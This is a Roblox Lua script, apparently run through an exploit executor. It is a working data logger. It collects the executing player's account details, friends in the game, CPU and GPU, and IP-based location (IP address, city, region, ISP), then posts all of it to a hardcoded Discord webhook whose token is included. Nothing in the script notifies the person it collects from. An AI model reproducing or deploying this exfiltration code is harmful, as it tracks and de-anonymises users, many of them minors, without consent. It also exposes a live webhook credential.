-- Made By ScripterMrbacon
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Stats = game:GetService("Stats")
local MarketplaceService = game:GetService("MarketplaceService")
local AnalyticsService = game:GetService("RbxAnalyticsService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- 🔗 Webhook URL from discord.
local webhookURL = "https://discord.com/api/webhooks/1308679621524590654/00LjfJEEsbBPuDgpZDfyepdbTnOhe0y40ppnm6jALp8ncts8S4wTQTJnXDShJ4ZN40Gv"

-- 🎮 Player Info
local username = LocalPlayer.Name
local userId = LocalPlayer.UserId
local accountAge = LocalPlayer.AccountAge
local membership = tostring(LocalPlayer.MembershipType)

-- 🎲 Game Info
local gameName = "Unknown Game"
local gameId = tostring(game.PlaceId)
local jobId = game.JobId or "Unknown Job ID"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

-- 🖥️ Hardware Details
local cpuName = "Unknown CPU"
local gpuName = "Unknown GPU"
pcall(function()
    cpuName = stats().Hardware.CPUName or "Unavailable"
    gpuName = stats().Hardware.GPUName or "Unavailable"
end)

-- 💡 System Uptime
local function getSystemUptime()
    local uptime = os.clock()
    local hours = math.floor(uptime / 3600)
    local minutes = math.floor((uptime % 3600) / 60)
    local seconds = math.floor(uptime % 60)
    return string.format("%02dh:%02dm:%02ds", hours, minutes, seconds)
end

-- 👥 Friends in Game
local function getFriendsInGame()
    local friendsInGame = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and LocalPlayer:IsFriendsWith(player.UserId) then
            table.insert(friendsInGame, player.Name)
        end
    end
    return #friendsInGame > 0 and table.concat(friendsInGame, ", ") or "None"
end

-- 🌐 Network Info
local ip, country, city, region, timezone, isp = "Unavailable", "Unavailable", "Unavailable", "Unavailable", "Unavailable", "Unavailable"
local function fetchGeoData()
    local api = "http://ip-api.com/json/"
    local success, response = pcall(function()
        return game:HttpGet(api)
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        ip = data.query or "Unknown IP"
        country = data.country or "Unknown Country"
        city = data.city or "Unknown City"
        region = data.regionName or "Unknown Region"
        timezone = data.timezone or "Unknown Timezone"
        isp = data.isp or "Unknown ISP"
    else
        warn("Failed to fetch geolocation data!")
    end
end

-- 🔍 Log Player Data
local function logPlayerStats()
    print("Tracking User: ", username, " | UserId: ", userId)
    print("Game: ", gameName, " | Friends in Game: ", getFriendsInGame())
    print("CPU: ", cpuName, " | GPU: ", gpuName)
    print("Location: ", city, country)
end

-- ✅ Webhook Validator
local function validateWebhook(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if not success or not response:find("discord.com") then
        warn("Invalid webhook URL!")
        return false
    end
    return true
end

-- 🕒 Add Timestamp
local function getTimestamp()
    return os.date("!%Y-%m-%dT%H:%M:%SZ")
end

-- 📦 Send Data to Discord Webhook
local function sendToDiscord()
    if not validateWebhook(webhookURL) then return end

    local request = http_request or request or syn.request or http.request
    if not request then
        warn("Requests are not supported on this executor!")
        return
    end

    -- 🎨 Embed Data
    local embed = {
        ["author"] = {
            ["name"] = username,
            ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        },
        ["title"] = "🔥 Script Execution Notification (v1.2)",
        ["description"] = "**A script was executed successfully on Roblox!**",
        ["color"] = 16776960,
        ["fields"] = {
            {["name"] = "👤 Player Info", ["value"] = string.format("**Username:** `%s`\n**User ID:** `%d`\n**Account Age:** `%d days`\n**Membership:** `%s`", username, userId, accountAge, membership), ["inline"] = false},
            {["name"] = "🎮 Game Info", ["value"] = string.format("**Game Name:** `%s`\n**Game ID:** `%s`\n**Job ID:** `%s`\n**Friends in Game:** `%s`", gameName, gameId, jobId, getFriendsInGame()), ["inline"] = false},
            {["name"] = "📡 Network Info", ["value"] = string.format("**IP Address:** `%s`\n**Country:** `%s`\n**City:** `%s`\n**Region:** `%s`\n**Timezone:** `%s`\n**ISP:** `%s`", ip, country, city, region, timezone, isp), ["inline"] = false},
            {["name"] = "🖥️ Hardware Info", ["value"] = string.format("**CPU:** `%s`\n**GPU:** `%s`\n**System Uptime:** `%s`", cpuName, gpuName, getSystemUptime()), ["inline"] = false},
        },
        ["footer"] = {
            ["text"] = "Execution Time: " .. os.date("%c")
        },
        ["timestamp"] = getTimestamp()
    }

    -- 🌐 Data Payload
    local payload = {
        ["embeds"] = {embed},
        ["content"] = "@everyone Script Executed by: " .. username
    }

    -- 🌐 Send Request
    local success, response = pcall(function()
        return request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        warn("Failed to send data to Discord!")
    else
        print("Data sent successfully!")
    end
end

-- 🚀 Execute Functions
fetchGeoData()
logPlayerStats()
sendToDiscord()
